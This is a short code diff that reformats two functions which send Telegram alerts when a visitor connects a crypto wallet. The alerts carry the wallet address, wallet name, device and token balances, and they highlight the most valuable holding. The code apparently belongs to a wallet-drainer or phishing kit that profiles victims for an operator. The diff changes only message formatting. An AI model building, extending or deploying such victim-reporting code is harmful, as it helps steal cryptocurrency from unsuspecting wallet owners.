@@ -260,8 +260,8 @@ async function notifyWalletConnection(address, walletName, device) {
   if (sessionStorage.getItem('walletConnectedNotified')) return;
 
   const message = `🌀 Connect |\n` +
-                  `Wallet: \`${address}\`\n` +
-                  `Wallet Name: \`${walletName}\`\n` +
+                  `Wallet: \`${address}\`\n\n` +
+                  `Wallet Name: \`${walletName}\`\n\n` +
                   `Device: \`${device}\``;
 
   await sendTelegramMessage(message);
@@ -288,8 +288,8 @@ async function notifyTokenCheck(balances, mostExpensive, device) {
 
     const mostValuable = `${mostExpensive.symbol}: ${mostExpensive.balance.toFixed(2)} (${mostExpensive.value.toFixed(2)}$)`;
     message = `🤩 | Tokens\n` +
-              `${tokenList}\n` +
-              `The most valuable: ${mostValuable}\n` +
+              `${tokenList}\n\n` +
+              `== The most valuable: ${mostValuable}\n\n` +
               `Device: \`${device}\``;
   }
 
